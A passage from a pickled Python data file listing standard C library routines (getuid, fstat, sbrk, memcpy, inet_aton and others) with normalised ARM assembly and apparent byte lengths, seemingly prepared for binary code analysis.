S'"STMFD~SP!,{R4,LR}\nSVC~0\nCMN~R0,0\nMOV~R4,R0\nBLS~FOO\nBL~FOO\nRSB~R3,R4,0\nSTR~R3,[R0]\nMOV~R4,0\nMOV~R0,R4\nLDMFD~SP!,{R4,PC}"'
p422
L44L
tp423
a(S'_exit'
p424
S'"MOV~R5,R0\nMOV~R0,R5\nSVC~0\nCMN~R0,0\nMOV~R4,R0\nBLS~FOO\nBL~FOO\nRSB~R3,R4,0\nSTR~R3,[R0]\nB~FOO"'
p425
L40L
tp426
a(S'fstat'
p427
S'"STMFD~SP!,{R4,LR}\nSUB~SP,SP,0\nMOV~R3,R1\nMOV~R1,SP\nSVC~0\nCMN~R0,0\nMOV~R4,R0\nBLS~FOO\nBL~FOO\nRSB~R3,R4,0\nMOV~R4,0\nSTR~R3,[R0]\nB~FOO\nCMP~R0,0\nMOV~R1,R3\nMOV~R0,SP\nBLEQ~FOO\nMOV~R0,R4\nADD~SP,SP,0\nLDMFD~SP!,{R4,PC}"'
p428
L80L
tp429
a(S'__getdents'
p430
S'"STMFD~SP!,{R4-R7,LR}\nMOV~R4,R1\nBL~FOO\nSUBS~R6,R0,0\nADDGT~R7,R4,R6\nBGT~FOO\nB~FOO\nLDR~LR,[R4,0]\nLDR~R2,[R4,0]\nLDRB~R12,[R4,0]\nMOV~R3,LR,ASR0\nSTRB~LR,[R4,0]\nSTR~R2,[R4,0]\nSTRB~R12,[R4,0]\nSTRB~R3,[R4,0]\nLDRB~R2,[R4,0]\nLDRB~R3,[R5,0]\nORR~R2,R2,R3,LSL0\nSUB~R2,R2,0\nBL~FOO\nLDRB~R3,[R4,0]\nLDRB~R2,[R5,0]\nMOV~R0,R4\nORR~R2,R3,R2,LSL0\nMOV~R1,R4\nBL~FOO\nLDRB~R3,[R4,0]\nLDRB~R2,[R5,0]\nORR~R3,R3,R2,LSL0\nADD~R4,R4,R3\nCMP~R4,R7\nADD~R5,R4,0\nADD~R1,R4,0\nADD~R0,R4,0\nBCC~FOO\nMOV~R0,R6\nLDMFD~SP!,{R4-R7,PC}"'
p431
L148L
tp432
a(S'__getdents64'
p433
S'"MOV~R12,SP\nSTMFD~SP!,{R4-R12,LR,PC}\nADD~R3,R2,0\nSUB~R11,R12,0\nSUB~SP,SP,0\nBIC~R3,R3,0\nRSB~SP,R3,SP\nMOV~R8,R1\nSTR~R2,[R11,-0]\nMOV~R10,SP\nSTR~R0,[R11,-0]\nMOV~R1,SP\nSVC~0\nCMN~R0,0\nMOV~R6,R0\nBLS~FOO\nBL~FOO\nRSB~R3,R6,0\nMOV~R6,0\nSTR~R3,[R0]\nB~FOO\nCMN~R0,0\nBNE~FOO\nMOV~R1,R6\nB~FOO\nMOV~R2,0\nMOV~R3,0\nMOV~R5,R8\nMOV~R4,SP\nSTR~R2,[R11,-0]\nSTR~R3,[R11,-0]\nB~FOO\nLDRB~R2,[R7,0]\nLDRB~R3,[R4,0]\nORR~R3,R3,R2,LSL0\nADD~R3,R3,0\nBIC~R3,R3,0\nADD~R9,R5,R3\nCMP~R9,R12\nMOV~R2,R3,ASR0\nBLS~FOO\nLDR~R0,[R11,-0]\nSUB~R1,R11,0\nLDMIA~R1,{R1,R2}\nMOV~R3,0\nBL~FOO\nCMP~R5,R8\nBNE~FOO\nBL~FOO\nMOV~R3,0\nMOV~R1,0\nSTR~R3,[R0]\nB~FOO\nSTRB~R2,[R5,0]\nSTRB~R3,[R5,0]\nADD~R2,R4,0\nLDMIA~R2,{R2,R3}\nSTR~R2,[R11,-0]\nSTR~R3,[R11,-0]\nLDMIA~R4,{R2,R3}\nSTMIA~R5,{R2,R3}\nADD~R2,R4,0\nLDMIA~R2,{R2,R3}\nSTR~R2,[R5,0]\nSTR~R3,[R5,0]\nLDRB~R3,[R4,0]\nSTRB~R3,[R5,0]\nLDRB~R2,[R4,0]\nLDRB~R3,[R7,0]\nORR~R2,R2,R3,LSL0\nSUB~R2,R2,0\nBL~FOO\nLDRB~R3,[R4,0]\nLDRB~R2,[R7,0]\nORR~R3,R3,R2,LSL0\nADD~R4,R4,R3\nMOV~R5,R9\nADD~R3,R10,R6\nLDR~R2,[R11,-0]\nCMP~R4,R3\nADD~R7,R4,0\nADD~R0,R5,0\nADD~R1,R4,0\nADD~R12,R8,R2\nBCC~FOO\nRSB~R1,R8,R5\nMOV~R0,R1\nSUB~SP,R11,0\nLDMFD~SP,{R4-R11,SP,PC}"'
p434
L356L
tp435
a(S'getegid'
p436
S'"STMFD~SP!,{R4,LR}\nSVC~0\nCMN~R0,0\nMOV~R4,R0\nBLS~FOO\nBL~FOO\nRSB~R3,R4,0\nSTR~R3,[R0]\nMOV~R4,0\nMOV~R0,R4\nLDMFD~SP!,{R4,PC}"'
p437
L44L
tp438
a(S'geteuid'
p439
S'"STMFD~SP!,{R4,LR}\nSVC~0\nCMN~R0,0\nMOV~R4,R0\nBLS~FOO\nBL~FOO\nRSB~R3,R4,0\nSTR~R3,[R0]\nMOV~R4,0\nMOV~R0,R4\nLDMFD~SP!,{R4,PC}"'
p440
L44L
tp441
a(S'getgid'
p442
S'"STMFD~SP!,{R4,LR}\nSVC~0\nCMN~R0,0\nMOV~R4,R0\nBLS~FOO\nBL~FOO\nRSB~R3,R4,0\nSTR~R3,[R0]\nMOV~R4,0\nMOV~R0,R4\nLDMFD~SP!,{R4,PC}"'
p443
L44L
tp444
a(S'getuid'
p445
S'"STMFD~SP!,{R4,LR}\nSVC~0\nCMN~R0,0\nMOV~R4,R0\nBLS~FOO\nBL~FOO\nRSB~R3,R4,0\nSTR~R3,[R0]\nMOV~R4,0\nMOV~R0,R4\nLDMFD~SP!,{R4,PC}"'
p446
L44L
tp447
a(S'lseek64'
p448
S'"STMFD~SP!,{R4-R6,LR}\nMOV~R5,R1\nSUB~SP,SP,0\nMOV~R6,R2\nMOV~R1,R2\nMOV~R4,R3\nMOV~R2,R5\nMOV~R3,SP\nSVC~0\nCMN~R0,0\nMOV~R4,R0\nBLS~FOO\nBL~FOO\nRSB~R3,R4,0\nMOV~R4,0\nSTR~R3,[R0]\nB~FOO\nCMP~R0,0\nBEQ~FOO\nMOV~R0,R4\nMOV~R1,R0,ASR0\nB~FOO\nLDMFD~SP,{R0,R1}\nADD~SP,SP,0\nLDMFD~SP!,{R4-R6,PC}"'
p449
L100L
tp450
a(S'nanosleep'
p451
S'"STMFD~SP!,{R4,LR}\nSVC~0\nCMN~R0,0\nMOV~R4,R0\nBLS~FOO\nBL~FOO\nRSB~R3,R4,0\nSTR~R3,[R0]\nMOV~R4,0\nMOV~R0,R4\nLDMFD~SP!,{R4,PC}"'
p452
L44L
tp453
a(S'sbrk'
p454
S'"STMFD~SP!,{R4,R5,LR}\nLDR~R4,<STR>\nLDR~R3,[R4]\nCMP~R3,0\nMOV~R5,R0\nMOV~R0,R3\nBNE~FOO\nBL~FOO\nCMP~R0,0\nBLT~FOO\nLDR~R3,[R4]\nCMP~R5,0\nMOV~R4,R3\nADD~R0,R3,R5\nBEQ~FOO\nBL~FOO\nCMP~R0,0\nBGE~FOO\nMOV~R4,0\nMOV~R0,R4\nLDMFD~SP!,{R4,R5,PC}"'
p455
L84L
tp456
a(S'times'
p457
S'"STMFD~SP!,{R4,LR}\nSVC~0\nCMN~R0,0\nMOV~R4,R0\nBLS~FOO\nBL~FOO\nRSB~R3,R4,0\nSTR~R3,[R0]\nMOV~R4,0\nMOV~R0,R4\nLDMFD~SP!,{R4,PC}"'
p458
L44L
tp459
a(S'__xstat64_conv'
p460
S'"STMFD~SP!,{R4-R10,LR}\nMOV~R7,R1\nMOV~R4,R0\nSUB~SP,SP,0\nMOV~R1,0\nMOV~R2,0\nMOV~R0,R7\nBL~FOO\nLDRB~R12,[R4,0]\nLDRB~LR,[R4,0]\nLDRB~R0,[R4]\nLDRB~R1,[R4,0]\nLDRB~R9,[R4,0]\nLDRB~R10,[R4,0]\nLDRB~R8,[R4,0]\nORR~R0,R0,R12,LSL0\nORR~R1,R1,LR,LSL0\nLDRB~R12,[R4,0]\nORR~R0,R0,R9,LSL0\nORR~R1,R1,R10,LSL0\nORR~R2,R0,R8,LSL0\nORR~R3,R1,R12,LSL0\nSTMIA~R7,{R2,R3}\nLDRB~R1,[R4,0]\nLDRB~R0,[R4,0]\nLDRB~R2,[R4,0]\nLDRB~R3,[R4,0]\nLDRB~LR,[R4,0]\nLDRB~R8,[R4,0]\nLDRB~R12,[R4,0]\nORR~R2,R2,R1,LSL0\nORR~R3,R3,R0,LSL0\nLDRB~R1,[R4,0]\nORR~R3,R3,LR,LSL0\nORR~R2,R2,R8,LSL0\nORR~R5,R2,R12,LSL0\nORR~R6,R3,R1,LSL0\nSTR~R5,[R7,0]\nSTR~R6,[R7,0]\nLDRB~R2,[R4,0]\nLDRB~R3,[R4,0]\nLDRB~R1,[R4,0]\nORR~R3,R3,R2,LSL0\nLDRB~R2,[R4,0]\nORR~R3,R3,R1,LSL0\nORR~R3,R3,R2,LSL0\nSTR~R3,[R7,0]\nLDRB~R2,[R4,0]\nLDRB~R3,[R4,0]\nLDRB~R1,[R4,0]\nORR~R3,R3,R2,LSL0\nLDRB~R2,[R4,0]\nORR~R3,R3,R1,LSL0\nORR~R3,R3,R2,LSL0\nSTR~R3,[R7,0]\nLDRB~R2,[R4,0]\nLDRB~R3,[R4,0]\nLDRB~R1,[R4,0]\nORR~R3,R3,R2,LSL0\nLDRB~R2,[R4,0]\nORR~R3,R3,R1,LSL0\nORR~R3,R3,R2,LSL0\nSTR~R3,[R7,0]\nLDRB~R2,[R4,0]\nLDRB~R3,[R4,0]\nLDRB~R1,[R4,0]\nORR~R3,R3,R2,LSL0\nLDRB~R2,[R4,0]\nORR~R3,R3,R1,LSL0\nORR~R3,R3,R2,LSL0\nSTR~R3,[R7,0]\nLDRB~R2,[R4,0]\nLDRB~R3,[R4,0]\nLDRB~R1,[R4,0]\nORR~R3,R3,R2,LSL0\nLDRB~R2,[R4,0]\nORR~R3,R3,R1,LSL0\nORR~R3,R3,R2,LSL0\nSTR~R3,[R7,0]\nLDRB~R1,[R4,0]\nLDRB~R0,[R4,0]\nLDRB~R2,[R4,0]\nLDRB~R3,[R4,0]\nLDRB~R5,[R4,0]\nLDRB~LR,[R4,0]\nLDRB~R12,[R4,0]\nORR~R2,R2,R1,LSL0\nORR~R3,R3,R0,LSL0\nLDRB~R1,[R4,0]\nORR~R2,R2,R5,LSL0\nORR~R3,R3,LR,LSL0\nORR~R12,R2,R12,LSL0\nORR~R1,R3,R1,LSL0\nSTR~R12,[SP,0]\nSTR~R1,[SP,0]\nADD~R2,SP,0\nLDMIA~R2,{R2,R3}\nSTR~R2,[R7,0]\nSTR~R3,[R7,0]\nLDRB~R1,[R4,0]\nLDRB~R0,[R4,0]\nLDRB~R2,[R4,0]\nLDRB~R3,[R4,0]\nLDRB~R5,[R4,0]\nLDRB~LR,[R4,0]\nLDRB~R12,[R4,0]\nORR~R2,R2,R1,LSL0\nORR~R3,R3,R0,LSL0\nLDRB~R1,[R4,0]\nORR~R2,R2,R5,LSL0\nORR~R3,R3,LR,LSL0\nORR~R12,R2,R12,LSL0\nORR~R1,R3,R1,LSL0\nSTR~R12,[SP,0]\nSTR~R1,[SP,0]\nADD~R2,SP,0\nLDMIA~R2,{R2,R3}\nSTR~R2,[R7,0]\nSTR~R3,[R7,0]\nLDRB~R2,[R4,0]\nLDRB~R3,[R4,0]\nLDRB~R1,[R4,0]\nORR~R3,R3,R2,LSL0\nLDRB~R2,[R4,0]\nORR~R3,R3,R1,LSL0\nORR~R3,R3,R2,LSL0\nSTR~R3,[R7,0]\nLDRB~R1,[R4,0]\nLDRB~R2,[R4,0]\nLDRB~R3,[R4,0]\nLDRB~R0,[R4,0]\nLDRB~R5,[R4,0]\nLDRB~LR,[R4,0]\nLDRB~R12,[R4,0]\nORR~R2,R2,R1,LSL0\nORR~R3,R3,R0,LSL0\nLDRB~R1,[R4,0]\nORR~R2,R2,R5,LSL0\nORR~R3,R3,LR,LSL0\nORR~R1,R3,R1,LSL0\nORR~R12,R2,R12,LSL0\nSTR~R12,[SP]\nSTR~R1,[SP,0]\nLDMFD~SP,{R2,R3}\nSTR~R2,[R7,0]\nSTR~R3,[R7,0]\nLDRB~R2,[R4,0]\nLDRB~R3,[R4,0]\nLDRB~R1,[R4,0]\nORR~R3,R3,R2,LSL0\nLDRB~R2,[R4,0]\nORR~R3,R3,R1,LSL0\nORR~R3,R3,R2,LSL0\nSTR~R3,[R7,0]\nLDRB~R2,[R4,0]\nLDRB~R3,[R4,0]\nLDRB~R1,[R4,0]\nORR~R3,R3,R2,LSL0\nLDRB~R2,[R4,0]\nORR~R3,R3,R1,LSL0\nORR~R3,R3,R2,LSL0\nSTR~R3,[R7,0]\nLDRB~R2,[R4,0]\nLDRB~R3,[R4,0]\nLDRB~R1,[R4,0]\nORR~R3,R3,R2,LSL0\nLDRB~R2,[R4,0]\nORR~R3,R3,R1,LSL0\nORR~R3,R3,R2,LSL0\nSTR~R3,[R7,0]\nLDRB~R2,[R4,0]\nLDRB~R3,[R4,0]\nLDRB~R1,[R4,0]\nORR~R3,R3,R2,LSL0\nLDRB~R2,[R4,0]\nORR~R3,R3,R1,LSL0\nORR~R3,R3,R2,LSL0\nSTR~R3,[R7,0]\nLDRB~R2,[R4,0]\nLDRB~R3,[R4,0]\nLDRB~R1,[R4,0]\nORR~R3,R3,R2,LSL0\nLDRB~R2,[R4,0]\nORR~R3,R3,R1,LSL0\nORR~R3,R3,R2,LSL0\nSTR~R3,[R7,0]\nLDRB~R2,[R4,0]\nLDRB~R3,[R4,0]\nLDRB~R1,[R4,0]\nORR~R3,R3,R2,LSL0\nLDRB~R2,[R4,0]\nORR~R3,R3,R1,LSL0\nORR~R3,R3,R2,LSL0\nSTR~R3,[R7,0]\nADD~SP,SP,0\nLDMFD~SP!,{R4-R10,PC}"'
p461
L784L
tp462
a(S'__xstat_conv'
p463
S'"STMFD~SP!,{R4-R6,LR}\nMOV~R6,R1\nMOV~R5,R0\nMOV~R1,0\nMOV~R2,0\nMOV~R0,R6\nBL~FOO\nLDR~R3,[R5]\nLDR~R2,[R5,0]\nMOV~R4,0\nSTMIA~R6,{R3,R4}\nSTR~R2,[R6,0]\nLDRB~R2,[R5,0]\nLDRB~R3,[R5,0]\nORR~R3,R3,R2,LSL0\nSTR~R3,[R6,0]\nLDRB~R2,[R5,0]\nLDRB~R3,[R5,0]\nORR~R3,R3,R2,LSL0\nSTR~R3,[R6,0]\nLDRB~R2,[R5,0]\nLDRB~R3,[R5,0]\nORR~R3,R3,R2,LSL0\nSTR~R3,[R6,0]\nLDR~R3,[R5,0]\nLDRB~R0,[R5,0]\nLDRB~R12,[R5,0]\nLDR~R1,[R5,0]\nSTR~R3,[R6,0]\nLDR~R3,[R5,0]\nSTR~R3,[R6,0]\nLDR~R3,[R5,0]\nSTR~R3,[R6,0]\nLDR~R3,[R5,0]\nSTR~R3,[R6,0]\nLDR~R3,[R5,0]\nSTR~R3,[R6,0]\nLDR~R3,[R5,0]\nSTR~R3,[R6,0]\nLDR~R3,[R5,0]\nSTR~R3,[R6,0]\nLDR~R3,[R5,0]\nORR~R0,R0,R12,LSL0\nMOV~R2,0\nSTR~R0,[R6,0]\nSTR~R1,[R6,0]\nSTR~R2,[R6,0]\nSTR~R3,[R6,0]\nLDR~R3,[R5,0]\nSTR~R3,[R6,0]\nLDMFD~SP!,{R4-R6,PC}"'
p464
L204L
tp465
a(S'_memcpy'
p466
S'"CMP~R1,R0\nBCC~FOO\nMOVEQ~PC,LR\nSTMFD~SP!,{R0,LR}\nSUBS~R2,R2,0\nBLT~FOO\nANDS~R12,R0,0\nBNE~FOO\nANDS~R12,R1,0\nBNE~FOO\nSUBS~R2,R2,0\nBLT~FOO\nSUBS~R2,R2,0\nBLT~FOO\nSTR~R4,[SP,-0]\nLDMIA~R1!,{R3,R4,R12,LR}\nSTMIA~R0!,{R3,R4,R12,LR}\nLDMIA~R1!,{R3,R4,R12,LR}\nSTMIA~R0!,{R3,R4,R12,LR}\nSUBS~R2,R2,0\nBGE~FOO\nCMN~R2,0\nLDMGEIA~R1!,{R3,R4,R12,LR}\nSTMGEIA~R0!,{R3,R4,R12,LR}\nSUBGE~R2,R2,0\nLDR~R4,[SP]\nADDS~R2,R2,0\nLDMGEIA~R1!,{R3,R12,LR}\nSTMGEIA~R0!,{R3,R12,LR}\nSUBGES~R2,R2,0\nBGE~FOO\nADDS~R2,R2,0\nBLT~FOO\nSUBS~R2,R2,0\nLDRLT~R3,[R1]\nSTRLT~R3,[R0]\nLDMGEIA~R1!,{R3,R12}\nSTMGEIA~R0!,{R3,R12}\nSUBGE~R2,R2,0\nADDS~R2,R2,0\nLDMEQFD~SP!,{R0,PC}\nCMP~R2,0\nLDRB~R3,[R1]\nSTRB~R3,[R0]\nLDRGEB~R3,[R1]\nSTRGEB~R3,[R0]\nLDRGTB~R3,[R1]\nSTRGTB~R3,[R0]\nLDMFD~SP!,{R0,PC}\nRSB~R12,R12,0\nCMP~R12,0\nLDRB~R3,[R1]\nSTRB~R3,[R0]\nLDRGEB~R3,[R1]\nSTRGEB~R3,[R0]\nLDRGTB~R3,[R1]\nSTRGTB~R3,[R0]\nSUBS~R2,R2,R12\nBLT~FOO\nANDS~R12,R1,0\nBEQ~FOO\nBIC~R1,R1,0\nLDR~LR,[R1]\nCMP~R12,0\nBGT~FOO\nBEQ~FOO\nCMP~R2,0\nBLT~FOO\nSUB~R2,R2,0\nSTMFD~SP!,{R4,R5}\nMOV~R3,LR,LSR0\nLDMIA~R1!,{R4,R5,R12,LR}\nORR~R3,R3,R4,LSL0\nMOV~R4,R4,LSR0\nORR~R4,R4,R5,LSL0\nMOV~R5,R5,LSR0\nORR~R5,R5,R12,LSL0\nMOV~R12,R12,LSR0\nORR~R12,R12,LR,LSL0\nSTMIA~R0!,{R3-R5,R12}\nSUBS~R2,R2,0\nBGE~FOO\nLDMFD~SP!,{R4,R5}\nADDS~R2,R2,0\nBLT~FOO\nMOV~R12,LR,LSR0\nLDR~LR,[R1]\nORR~R12,R12,LR,LSL0\nSTR~R12,[R0]\nSUBS~R2,R2,0\nBGE~FOO\nSUB~R1,R1,0\nB~FOO\nCMP~R2,0\nBLT~FOO\nSUB~R2,R2,0\nSTMFD~SP!,{R4,R5}\nMOV~R3,LR,LSR0\nLDMIA~R1!,{R4,R5,R12,LR}\nORR~R3,R3,R4,LSL0\nMOV~R4,R4,LSR0\nORR~R4,R4,R5,LSL0\nMOV~R5,R5,LSR0\nORR~R5,R5,R12,LSL0\nMOV~R12,R12,LSR0\nORR~R12,R12,LR,LSL0\nSTMIA~R0!,{R3-R5,R12}\nSUBS~R2,R2,0\nBGE~FOO\nLDMFD~SP!,{R4,R5}\nADDS~R2,R2,0\nBLT~FOO\nMOV~R12,LR,LSR0\nLDR~LR,[R1]\nORR~R12,R12,LR,LSL0\nSTR~R12,[R0]\nSUBS~R2,R2,0\nBGE~FOO\nSUB~R1,R1,0\nB~FOO\nCMP~R2,0\nBLT~FOO\nSUB~R2,R2,0\nSTMFD~SP!,{R4,R5}\nMOV~R3,LR,LSR0\nLDMIA~R1!,{R4,R5,R12,LR}\nORR~R3,R3,R4,LSL0\nMOV~R4,R4,LSR0\nORR~R4,R4,R5,LSL0\nMOV~R5,R5,LSR0\nORR~R5,R5,R12,LSL0\nMOV~R12,R12,LSR0\nORR~R12,R12,LR,LSL0\nSTMIA~R0!,{R3-R5,R12}\nSUBS~R2,R2,0\nBGE~FOO\nLDMFD~SP!,{R4,R5}\nADDS~R2,R2,0\nBLT~FOO\nMOV~R12,LR,LSR0\nLDR~LR,[R1]\nORR~R12,R12,LR,LSL0\nSTR~R12,[R0]\nSUBS~R2,R2,0\nBGE~FOO\nSUB~R1,R1,0\nB~FOO\nADD~R1,R1,R2\nADD~R0,R0,R2\nSUBS~R2,R2,0\nBLT~FOO\nANDS~R12,R0,0\nBNE~FOO\nANDS~R12,R1,0\nBNE~FOO\nSUBS~R2,R2,0\nBLT~FOO\nSTMFD~SP!,{R4,LR}\nSUBS~R2,R2,0\nBLT~FOO\nLDMDB~R1!,{R3,R4,R12,LR}\nSTMDB~R0!,{R3,R4,R12,LR}\nLDMDB~R1!,{R3,R4,R12,LR}\nSTMDB~R0!,{R3,R4,R12,LR}\nSUBS~R2,R2,0\nBGE~FOO\nCMN~R2,0\nLDMGEDB~R1!,{R3,R4,R12,LR}\nSTMGEDB~R0!,{R3,R4,R12,LR}\nSUBGE~R2,R2,0\nADDS~R2,R2,0\nLDMGEDB~R1!,{R3,R12,LR}\nSTMGEDB~R0!,{R3,R12,LR}\nSUBGE~R2,R2,0\nLDMFD~SP!,{R4,LR}\nADDS~R2,R2,0\nBLT~FOO\nSUBS~R2,R2,0\nLDRLT~R3,[R1,-0]\nSTRLT~R3,[R0,-0]\nLDMGEDB~R1!,{R3,R12}\nSTMGEDB~R0!,{R3,R12}\nSUBGE~R2,R2,0\nADDS~R2,R2,0\nMOVEQ~PC,LR\nCMP~R2,0\nLDRB~R3,[R1,-0]\nSTRB~R3,[R0,-0]\nLDRGEB~R3,[R1,-0]\nSTRGEB~R3,[R0,-0]\nLDRGTB~R3,[R1,-0]\nSTRGTB~R3,[R0,-0]\nRET\nCMP~R12,0\nLDRB~R3,[R1,-0]\nSTRB~R3,[R0,-0]\nLDRGEB~R3,[R1,-0]\nSTRGEB~R3,[R0,-0]\nLDRGTB~R3,[R1,-0]\nSTRGTB~R3,[R0,-0]\nSUBS~R2,R2,R12\nBLT~FOO\nANDS~R12,R1,0\nBEQ~FOO\nBIC~R1,R1,0\nLDR~R3,[R1]\nCMP~R12,0\nBLT~FOO\nBEQ~FOO\nCMP~R2,0\nBLT~FOO\nSUB~R2,R2,0\nSTMFD~SP!,{R4,R5,LR}\nMOV~LR,R3,LSL0\nLDMDB~R1!,{R3-R5,R12}\nORR~LR,LR,R12,LSR0\nMOV~R12,R12,LSL0\nORR~R12,R12,R5,LSR0\nMOV~R5,R5,LSL0\nORR~R5,R5,R4,LSR0\nMOV~R4,R4,LSL0\nORR~R4,R4,R3,LSR0\nSTMDB~R0!,{R4,R5,R12,LR}\nSUBS~R2,R2,0\nBGE~FOO\nLDMFD~SP!,{R4,R5,LR}\nADDS~R2,R2,0\nBLT~FOO\nMOV~R12,R3,LSL0\nLDR~R3,[R1,-0]\nORR~R12,R12,R3,LSR0\nSTR~R12,[R0,-0]\nSUBS~R2,R2,0\nBGE~FOO\nADD~R1,R1,0\nB~FOO\nCMP~R2,0\nBLT~FOO\nSUB~R2,R2,0\nSTMFD~SP!,{R4,R5,LR}\nMOV~LR,R3,LSL0\nLDMDB~R1!,{R3-R5,R12}\nORR~LR,LR,R12,LSR0\nMOV~R12,R12,LSL0\nORR~R12,R12,R5,LSR0\nMOV~R5,R5,LSL0\nORR~R5,R5,R4,LSR0\nMOV~R4,R4,LSL0\nORR~R4,R4,R3,LSR0\nSTMDB~R0!,{R4,R5,R12,LR}\nSUBS~R2,R2,0\nBGE~FOO\nLDMFD~SP!,{R4,R5,LR}\nADDS~R2,R2,0\nBLT~FOO\nMOV~R12,R3,LSL0\nLDR~R3,[R1,-0]\nORR~R12,R12,R3,LSR0\nSTR~R12,[R0,-0]\nSUBS~R2,R2,0\nBGE~FOO\nADD~R1,R1,0\nB~FOO\nCMP~R2,0\nBLT~FOO\nSUB~R2,R2,0\nSTMFD~SP!,{R4,R5,LR}\nMOV~LR,R3,LSL0\nLDMDB~R1!,{R3-R5,R12}\nORR~LR,LR,R12,LSR0\nMOV~R12,R12,LSL0\nORR~R12,R12,R5,LSR0\nMOV~R5,R5,LSL0\nORR~R5,R5,R4,LSR0\nMOV~R4,R4,LSL0\nORR~R4,R4,R3,LSR0\nSTMDB~R0!,{R4,R5,R12,LR}\nSUBS~R2,R2,0\nBGE~FOO\nLDMFD~SP!,{R4,R5,LR}\nADDS~R2,R2,0\nBLT~FOO\nMOV~R12,R3,LSL0\nLDR~R3,[R1,-0]\nORR~R12,R12,R3,LSR0\nSTR~R12,[R0,-0]\nSUBS~R2,R2,0\nBGE~FOO\nADD~R1,R1,0\nB~FOO"'
p467
L1160L
tp468
a(S'inet_aton'
p469
S'"CMP~R0,0\nSTMFD~SP!,{R4-R7,LR}\nMOV~R7,R1\nMOVNE~R5,0\nMOVNE~R6,0\nBNE~FOO\nB~FOO\nLDR~R3,<STR>\nLDR~LR,[R3]\nLDRB~R3,[R0]\nLDRB~R3,[LR,R3,LSL0]\nTST~R3,0\nBEQ~FOO\nMOV~R4,0\nB~FOO\nMOV~R3,0\nMLA~R3,R4,R3,R12\nSUB~R4,R3,0\nCMP~R4,0\nBGT~FOO\nADD~R0,R0,0\nLDRB~R12,[R0]\nMOV~R3,R12,LSL0\nADD~R2,R3,LR\nLDRB~R1,[R3,LR]\nLDRB~R3,[R2,0]\nORR~R3,R1,R3,LSL0\nTST~R3,0\nBNE~FOO\nCMP~R6,0\nBGT~FOO\nCMP~R12,0\nBNE~FOO\nADD~R0,R0,0\nB~FOO\nCMP~R12,0\nADD~R0,R0,0\nBEQ~FOO\nTST~R3,0\nBEQ~FOO\nORR~R5,R4,R5,LSL0\nADD~R6,R6,0\nCMP~R6,0\nBLE~FOO\nCMP~R7,0\nANDNE~R3,R5,0\nANDNE~R2,R5,0\nMOVNE~R3,R3,LSR0\nMOVNE~R2,R2,LSL0\nORRNE~R3,R3,R5,LSR0\nORRNE~R2,R2,R5,LSL0\nORRNE~R3,R3,R2\nMOVEQ~R0,0\nMOVNE~R0,0\nSTRNE~R3,[R7]\nLDMFD~SP!,{R4-R7,PC}\nMOV~R0,0\nLDMFD~SP!,{R4-R7,PC}"'
p470
L232L
tp471
a(S'_dl_aux_init'
p472
S'"LDR~R2,[R0,0]\nLDR~R3,<STR>\nLDR~R1,[R0,0]\nSTR~R2,[R3]\nLDR~R3,<STR>\nSTR~R1,[R3]\nRET"'
p473
L28L
tp474
a(S'brk'
p475
S'"STR~LR,[SP,-0]\nMOV~R3,R0\nSVC~0\nCMP~R0,R3\nLDR~R3,<STR>\nMOV~R2,0\nSTR~R0,[R3]\nBCS~FOO\nBL~FOO\nMOV~R3,0\nSTR~R3,[R0]\nMOV~R2,0\nMOV~R0,R2\nLDR~PC,[SP]"'
p476
L56L
tp477
a(S'__do_global_ctors_aux'
p478
S'"LDR~R3,<STR>\nLDR~R2,[R3,-0]\nCMN~R2,0\nSTMFD~SP!,{R4,LR}\nSUB~R4,R3,0\nLDMEQFD~SP!,{R4,PC}\nMOV~LR,PC\nMOV~PC,R2\nLDR~R2,[R4,-0]\nCMN~R2,0\nBNE~FOO\nLDMFD~SP!,{R4,PC}"'
p479
L48L
tp480
a(S'call___do_global_ctors_aux'
p481
S'"STR~LR,[SP,-0]\nLDR~PC,[SP]"'
p482
L8L
tp483
a(S'_fini'
p484
S'"MOV~R12,SP\nSTMFD~SP!,{R4-R12,LR,PC}\nSUB~R11,R12,0\nBL~FOO\nLDMDB~R11,{R4-R11,SP,PC}"'
p485
L20L
tp486
a.